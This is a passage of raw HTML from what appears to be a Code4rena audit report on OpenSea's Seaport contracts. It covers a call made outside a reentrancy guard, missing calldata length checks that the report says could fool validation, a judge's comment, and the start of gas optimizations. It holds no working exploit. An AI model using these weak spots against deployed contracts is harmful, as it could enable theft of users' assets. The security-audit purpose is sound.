href=\"#22-_triggerifarmed-done-outside-of-reentrancy-guards\" aria-label=\"22 _triggerifarmed done outside of reentrancy guards permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[22] <code>_triggerIfArmed()</code> done outside of reentrancy guards</h2>\n<p>The function <code>fulfillBasicOrder()</code> of the reference implementation is entirely protected by the reentrancy guard.\nHowever in the production implementation, the call to <code>_triggerIfArmed()</code> isn’t protected by the reentrancy guard.\nAs <code>_triggerIfArmed()</code> does external calls this doesn’t seem logical, however the risk seems low.</p>\n<p>For comparison: the comparable function<code>_validateAndFulfillAdvancedOrder()</code> is protected end to end by a reentrancy guard, which protects the call to <code>_applyFractionsAndTransferEach()</code> and thus the call to <code>_triggerIfArmed(accumulator);</code></p>\n<h3 id=\"proof-of-concept-25\" style=\"position:relative;\"><a href=\"#proof-of-concept-25\" aria-label=\"proof of concept 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong>\n<a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/reference/ReferenceConsideration.sol#L83-L93\">ReferenceConsideration.sol#L83-L93</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Consideration.sol#L76-L84\">Consideration.sol#L76-L84</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol\">BasicOrderFulfiller.sol</a><br>\nReference code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ReferenceConsideration</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ConsiderationInterface</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ReferenceOrderCombiner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fulfillBasicOrder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BasicOrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">) ... </span><span class=\"mtk11\">notEntered</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> ... {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Production code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Consideration</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ConsiderationInterface</span><span class=\"mtk1\">, </span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fulfillBasicOrder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BasicOrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">) ... {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">fulfilled</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_validateAndFulfillBasicOrder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateAndFulfillBasicOrder</span><span class=\"mtk1\">( ... ) ... {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_prepareBasicFulfillmentFromCalldata</span><span class=\"mtk1\">( ... ); </span><span class=\"mtk3\">// sets reentrancy guard</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_transferEthAndFinalize</span><span class=\"mtk1\">(... ) --</span><span class=\"mtk12\">or</span><span class=\"mtk1\">-- </span><span class=\"mtk11\">_transferERC20AndFinalize</span><span class=\"mtk1\">(...) </span><span class=\"mtk3\">// clears reentrancy guard</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ... </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_triggerIfArmed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accumulator</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">// not protected by reentrancy guard</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_prepareBasicFulfillmentFromCalldata</span><span class=\"mtk1\">(...) ... {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure this function cannot be triggered during a reentrant call.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_setReentrancyGuard</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_transferEthAndFinalize</span><span class=\"mtk1\">(...) ... {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Clear the reentrancy guard.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_clearReentrancyGuard</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_transferERC20AndFinalize</span><span class=\"mtk1\">(...) ... {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Clear the reentrancy guard.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_clearReentrancyGuard</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Do the <code>_clearReentrancyGuard();</code> after the call to <code>_triggerIfArmed(accumulator);</code></p>\n<h2 id=\"23-deviations-between-solidity-compilers-checks-and-seaports-checks-in-validateorderparameters\" style=\"position:relative;\"><a href=\"#23-deviations-between-solidity-compilers-checks-and-seaports-checks-in-validateorderparameters\" aria-label=\"23 deviations between solidity compilers checks and seaports checks in validateorderparameters permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[23] Deviations between Solidity compiler’s checks and seaport’s checks in <code>validateOrderParameters</code></h2>\n<p><strong>Context</strong>: <a href=\"https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/Assertions.sol#L105\">Assertions.sol#L105</a></p>\n<p>Some comments on comparison between code produced by solidity and this:</p>\n<ol>\n<li>\n<p>If there is a parameter <code>BasicOrderParameters calldata</code>, the compiler generates the following checks:</p>\n<ol>\n<li><code>calldatasize() &#x3C; 2**64</code>.</li>\n<li><code>calldataload(4) &#x3C; 2**64</code>. (Check if the initial offset is too big)</li>\n<li><code>calldatasize() - offset >= 0x244</code>.</li>\n</ol>\n</li>\n<li>The ABI encoder V2 has additional checks on whether <code>calldata</code> is properly clean. The compiler only does this checks when a value is read (a high level read; assembly doesn’t count). If you want to be complaint, then the values will need to be checked for sanity. For example, an <code>address</code> type should not have dirty higher order bits. For example, for <code>considerationToken</code>.</li>\n<li>This does not check for upper bounds of length of the array <code>additionalRecipients</code>. The compiler typically checks if length is <code>&#x3C; 2**64</code>. Similarly, for <code>bytes signature</code>. The length checks are surprisingly needed in general, otherwise some offset calculations can overflow and read values that it is not supposed to read. This can be used to fool some checks. Mentioned below.</li>\n<li>\n<p>Both <code>additionalRecipents</code> and <code>signature</code> are responsible for at least 1 word each in <code>calldata</code> (at least length should be present). The compiler checks this. But is likely missing here. </p>\n<ol>\n<li><a href=\"https://github.com/ethereum/solidity/blob/fdc3c8eedeae7327f772c368582e25fc6a5add5c/libsolidity/ast/Types.cpp#L1725\"><code>calldataEncodedTailSize</code></a></li>\n<li><a href=\"https://github.com/ethereum/solidity/blob/fdc3c8eedeae7327f772c368582e25fc6a5add5c/libsolidity/codegen/YulUtilFunctions.cpp#L2356\">the check</a> for tail size</li>\n</ol>\n</li>\n<li>The compiler checks that the length of the two dynamic arrays (appropriately scaled) + offsets wouldn’t be past <code>calldatasize()</code>. (Note: reading past <code>calldatasize()</code> would return 0).</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Document the differences. Consider adding additional checks, if the differences need to be accounted. See a related issue regarding overflowing length, which ideally needs to be fixed.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/203#issuecomment-1171063542\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This report and its merged issues* highlight several limitations which are informative to the Opensea team. This report is of high quality and is deserving of the best score. I consider all issues raised to be valid.</p>\n<p>*Merged issues: #<a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/108\">108</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/156\">156</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/176\">176</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/195\">195</a>, and <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/205\">205</a>.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 45 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/71\">report highlighted below</a> by <strong>Dravee</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/60\">shung</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/109\">OriDabush</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/144\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/181\">Spearbit</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/174\">cmichel</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/28\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/192\">NoamYakov</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/134\">djxploit</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/23\">0xalpharush</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/98\">Chom</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/191\">Czar102</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/42\">hickuphh3</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/103\">0x29A</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/64\">sirhashalot</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/52\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/178\">ming</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/162\">gzeon</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/4\">MaratCerby</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/210\">zkhorse</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/83\">zer0dot</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/159\">defsec</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/209\">Hawkeye</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/17\">ignacio</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/140\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/112\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/193\">rfa</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/20\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/63\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/154\">sashik_eth</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/128\">ilan</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/70\">kaden</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/57\">sach1r0</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/152\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/160\">twojoy</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/164\">ellahi</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/199\">TerrierLover</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/137\">asutorufos</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/157\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/148\">hake</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/86\">mayo</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/204\">peritoflores</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/100\">RoiEvenHaim</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/79\">Tadashi</a>, and <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/208\">foobar</a>.</em></p>\n<h2 id=\"table-of-contents-1\" style=\"position:relative;\"><a href=\"#table-of-contents-1\" aria-label=\"table of contents 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Table of Contents</h2>\n<ul>\n<li><strong>[G-01]</strong> Cheap Contract Deployment Through Clones</li>\n<li><strong>[G-02]</strong> <code>ConduitController.sol#createConduit()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</li>\n<li><strong>[G-03]</strong> <code>ConduitController.sol#acceptOwnership()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</li>\n<li><strong>[G-04]</strong> <code>OrderValidator.sol#_validateBasicOrderAndUpdateStatus()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</li>\n<li><strong>[G-05]</strong> <code>OrderValidator.sol#_validateBasicOrderAndUpdateStatus()</code>: avoid an unnecessary SSTORE by not writing a default value</li>\n<li><strong>[G-06]</strong> <code>OrderCombiner.sol</code>: <code>++totalFilteredExecutions</code> costs less gas compared to <code>totalFilteredExecutions += 1</code></li>\n<li><strong>[G-07]</strong> <code>OrderCombiner.sol</code>: <code>--maximumFulfilled</code> costs less gas compared to <code>maximumFulfilled--</code></li>\n<li><strong>[G-08]</strong> <code>FulfillmentApplier.sol#_applyFulfillment()</code>: Unchecking arithmetics operations that can’t underflow/overflow</li>\n<li><strong>[G-09]</strong> <code>/reference</code>: Unchecking arithmetics operations that can’t underflow/overflow</li>\n<li><strong>[G-10]</strong> <code>OR</code> conditions cost less than their equivalent <code>AND</code> conditions (“NOT(something is false)” costs less than “everything is true”)</li>\n<li><strong>[G-11]</strong> Bytes constants are more efficient than string constants</li>\n<li><strong>[G-12]</strong> An array’s length should be cached to save gas in for-loops</li>\n<li><strong>[G-13]</strong> Increments can be unchecked</li>\n<li><strong>[G-14]</strong> No need to explicitly initialize variables with default values</li>\n<li><strong>[G-15]</strong> <code>abi.encode()</code> is less efficient than <code>abi.encodePacked()</code></li>\n</ul>\n<h2 id=\"g-01-cheap-contract-deployment-through-clones\" style=\"position:relative;\"><a href=\"#g-01-cheap-contract-deployment-through-clones\" aria-label=\"g 01 cheap contract deployment through clones permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Cheap Contract Deployment Through Clones</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">conduit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ConduitController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">91</span><span class=\"mtk1\">:         </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Conduit</span><span class=\"mtk1\">{ </span><span class=\"mtk12\">salt</span><span class=\"mtk1\">: </span><span class=\"mtk10\">conduitKey</span><span class=\"mtk1\"> }(); </span><span class=\"mtk3\">//@audit gas: deployment can cost less through clones</span></span></span></code></pre>\n<p>There’s a way to save a significant amount of gas on deployment using Clones: <a href=\"https://www.youtube.com/watch?v=3Mw-pMmJ7TA\">https://www.youtube.com/watch?v=3Mw-pMmJ7TA</a> .</p>\n<p>This is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:</p>\n<ul>\n<li><a href=\"https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516\">https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516</a></li>\n<li><a href=\"https://github.com/porter-finance/v1-core/pull/34\">https://github.com/porter-finance/v1-core/pull/34</a></li>\n</ul>\n<p>I suggest applying a similar pattern, here with a <code>cloneDeterministic</code> method to mimic the current <code>create2</code></p>\n<h2 id=\"g-02-conduitcontrollersolcreateconduit-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it\" style=\"position:relative;\"><a href=\"#g-02-conduitcontrollersolcreateconduit-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it\" aria-label=\"g 02 conduitcontrollersolcreateconduit help the optimizer by saving a storage variables reference instead of repeatedly fetching it permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] <code>ConduitController.sol#createConduit()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it</h2>\n<p>To help the optimizer, declare a <code>storage</code> type variable and use it instead of repeatedly fetching the reference in a map or an array.</p>\n<p>The effect can be quite significant.</p>\n<p>As an example, instead of repeatedly calling <code>someMap[someIndex]</code>, save its reference like this: <code>SomeStruct storage someStruct = someMap[someIndex]</code> and use it.</p>\n<p>Affected code (check the <code>@audit</code> tags):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: ConduitController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 94:         _conduits[conduit].owner = initialOwner;  //@audit gas: similar to L130, should declare &quot;ConduitProperties storage _conduitProperties = _conduits[conduit];&quot; and use it to set owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 93:         ConduitProperties storage _conduitProperties = _conduits[conduit];</span></span></span>\n<span 